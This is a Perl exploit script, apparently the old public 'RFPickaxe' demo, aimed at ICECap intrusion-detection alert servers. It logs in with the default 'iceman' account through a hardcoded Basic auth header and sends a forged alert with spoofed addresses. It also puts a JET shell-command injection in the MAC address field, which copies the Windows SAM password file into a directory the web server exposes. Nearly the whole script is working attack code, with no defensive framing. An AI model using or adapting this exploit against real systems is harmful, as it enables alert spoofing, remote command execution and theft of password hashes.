#!/usr/bin/perl
#
# RFPickaxe.pl - demo exploit for default ICECap login/alerts
# Disclaimer: I do not provide technical support for my exploits!
#
# Sorry, this requires Unix, due to the `date` call

$|=1;
use Socket;

###############################################################

# IP of ICECap system (assumes port 8082)

$Target="10.10.200.4";

# account info - uses default 'iceman' w/ no password

$account="iceman";
$httpauth="aWNlbWFuOiUzQjclQzYlRkU=";

#-------- attributes of the alert ----------

$id="100005";
$issue_name="Exploit";
$sev="1";

# spoof these

$target="0.0.0.8";
$target_dns="some.host.com";
$det_ip="0.0.0.8";
$det_nbn="SENSOR";
$int_ip="255.255.255.255";
$param="Pickaxe";

# either fake the MAC, or use it to run commands via JET vulnerability

#$det_mac="0000000000000";
$det_mac="|shell(\"cmd /c copy c:\\winnt\\repair\\sam._ ".
        "c:\\progra~1\\networ~1\\icecap\\spatch\\en\\sam.exe \")|";

##############################################################


$inet=inet_aton($Target);

$time=`date -u "+%Y-%m-%d %T"`;
$time=~s/ /%20/g;
$time=~s/:/%3a/g;

#path is \program files\network ice\icecap\spatch\en

$alert="accountName=$account&issueID=$id&issueName=$issue_name".
        "&severity=$sev&targetNetAddress=$target&targetDNSName=".
        "$target_dns&detectorNetAddress=$det_ip&detectorNetBIOS".
        "Name=$det_nbn&detectorMacAddress=$det_mac&".
        "intruderNetAddress=$int_ip&detectorType=3&startTime=".
        "$time&parameter=$param\r\n";

$len=length($alert);

@DXX=();
$send=<<EOT
POST / HTTP/1.0
User-Agent: netice-alerter/1.0
Host: $Target:8082
Authorization: Basic $httpauth
Content-Type: application/x-www-form-urlencoded
Content-Length: $len

EOT
;

$send=~s/\n/\r\n/g;
$send=$send.$alert;

sendraw("$send");

print @DXX;

exit;

sub sendraw {   # raw network functions stay in here
        my ($pstr)=@_;
        $PROTO=getprotobyname('tcp')||0;

        # AF_INET=2 SOCK_STREAM=1
        eval {
        alarm(30);
        if(!(socket(S,2,1,$PROTO))){ die("socket");}
        if(connect(S,pack "SnA4x8",2,8082,$inet)){
                # multi-column perl coding...don't do as I do ;)
                select(S);      $|=1;
                print $pstr;
                @DXX=<S>;
                select(STDOUT); close(S);
                alarm(0);       return;
        } else { die("not responding"); }
        alarm(0);};
        if ($@) { if ($@ =~ /timeout/){ die("Timed out!\n");}}}
